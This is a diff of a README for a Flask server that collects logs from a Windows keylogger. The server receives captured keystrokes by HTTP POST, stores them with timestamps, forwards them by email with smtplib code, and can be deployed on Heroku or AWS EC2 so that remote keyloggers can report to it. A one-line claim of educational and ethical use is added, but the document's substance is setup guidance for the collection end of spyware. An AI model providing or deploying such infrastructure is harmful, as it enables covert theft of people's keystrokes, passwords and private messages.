@@ -1,47 +1,64 @@
-Keylogger Log Server
-Overview
-This Flask-based log server receives and stores logs from the Windows-based keylogger (keylogger.c). It supports local operation (e.g., http://127.0.0.1:5000 or http://192.168.1.3:5000), SMTP email transmission, or deployment on a remote server for receiving logs.
-Features
+# Keylogger Log Server
+
+## Overview
+This Flask-based log server receives and stores logs from the Windows-based keylogger (keylogger.c). It supports local operation (e.g., http://127.0.0.1:5000 or http://192.168.1.3:5000), SMTP email transmission, or remote server deployment for receiving logs. The server is designed for educational and ethical auditing purposes in controlled environments with explicit permission.
+
+## Features
 
 Receives keylogger logs via HTTP POST or SMTP email.
 Stores logs in a local file (e.g., server_logs.txt) with timestamps.
-Lightweight and customizable for local or remote deployment.
+Lightweight and customizable for local or remote setups.
+Supports ethical use in cybersecurity labs.
 
-Requirements
+## Requirements
 
-OS: Any OS supporting Python (tested on Windows 11)
-Python: Version 3.6+
-Dependencies: Flask (pip install flask), smtplib (standard library for SMTP)
-Network: Local network access or internet for remote/SMTP setup
+**OS**: Any OS supporting Python (tested on Windows 11)
+**Python**: Version 3.6 or higher
+**Dependencies**: Flask (pip install flask), smtplib (standard library for SMTP)
+**Network**: Local network access or internet for remote/SMTP setup
 
-Setup Instructions
+## Installation
 
-Install Python 3.6+ from python.org.
+1. Install Python 3.6+ from python.org.
 
-Install Flask:
+2. Install Flask:
 pip install flask
 
 
-Clone or download the log_server.py file.
+3. Clone or download the repository:
+git clone <repository-url>
+cd log-server
 
-Configure the keylogger to send logs to the server’s URL (e.g., http://127.0.0.1:5000/log) or email address for SMTP.
+
+4. Ensure the keylogger is configured to send logs to the server’s URL (e.g., http://127.0.0.1:5000/log) or an email address for SMTP.
 
 
-Customization
-Local Server
+## Usage
 
-Run the server locally (default):
+1. Run the Flask server:
 python log_server.py
 
 
-Access at http://127.0.0.1:5000 or a local network IP (e.g., 192.168.1.3:5000).
+2. The server starts at http://127.0.0.1:5000 (or a specified IP like 192.168.1.3:5000).
 
-Update the keylogger’s URL to match the server’s IP/port.
+3. Logs are received at the /log endpoint (HTTP POST) or via email (SMTP) and saved to server_logs.txt.
+
+4. Stop the server with Ctrl+C.
 
 
-SMTP Email Transmission
+## Customization
+**Local Server**
 
-Modify log_server.py to use smtplib for email:
+1. Default setup runs locally:
+python log_server.py
+
+
+2. Update the keylogger’s URL to match the server’s IP/port (e.g., http://192.168.1.3:5000/log).
+
+
+##SMTP Email Transmission
+
+1. Modify log_server.py to send logs via email using smtplib:
 import smtplib
 from email.mime.text import MIMEText
 
@@ -56,54 +73,39 @@ def send_email(log_data, recipient_email):
         server.send_message(msg)
 
 
-Generate an app-specific password for your email provider (e.g., Gmail).
+2. Generate an app-specific password from your email provider (e.g., Gmail’s 2-Step Verification settings).
 
-Update the keylogger to call send_email with logs and your recipient email.
+3. Configure the keylogger to call send_email with log data and a recipient email, or have the server forward POST requests as emails.
 
 
-Remote Server Deployment
+## Remote Server Deployment
 
-Deploy the Flask server to a cloud platform (e.g., Heroku, AWS EC2):
-Heroku:
-Create a Heroku app: heroku create your-app-name.
+1. Deploy to a cloud platform (e.g., Heroku, AWS EC2):
 
-Push the code: git push heroku main.
+**Heroku:**
 
-Set the port dynamically in log_server.py:
+1. Create a Heroku app: heroku create your-app-name.
+
+2. Push the code: git push heroku main.
+
+3. Set dynamic port in log_server.py:
 import os
 port = int(os.environ.get('PORT', 5000))
 app.run(host='0.0.0.0', port=port)
 
+4. Update the keylogger’s URL to the remote server’s address.
 
 
-
-
-
-Update the keylogger’s URL to the remote server’s public IP or domain (e.g., http://your-ec2-public-ip:5000/log).
-
-Usage
-
-Start the server (local or remote):
-python log_server.py
-
-
-The server receives logs at the /log endpoint (HTTP POST) or via email (SMTP).
-
-Logs are saved to server_logs.txt or emailed with timestamps.
-
-Stop the server with Ctrl+C.
-
-
-Considerations
+## Considerations
 
 Do not store or transmit sensitive data without encryption.
 
-Challenges Overcome
+## Challenges Overcome
 
-Resolved networking issues for stable HTTP/SMTP log transmission.
-Configured Flask server for reliable POST request handling.
-Managed log storage to prevent data loss.
-Overcame SMTP authentication and remote deployment hurdles.
+1. Resolved networking issues for stable HTTP/SMTP log transmission.
+2. Configured Flask for reliable POST request handling.
+3. Managed log storage to prevent data loss.
+4. Overcame SMTP authentication and remote deployment challenges.
 
 License
 This project is for educational purposes only and is not licensed for commercial or unethical use.
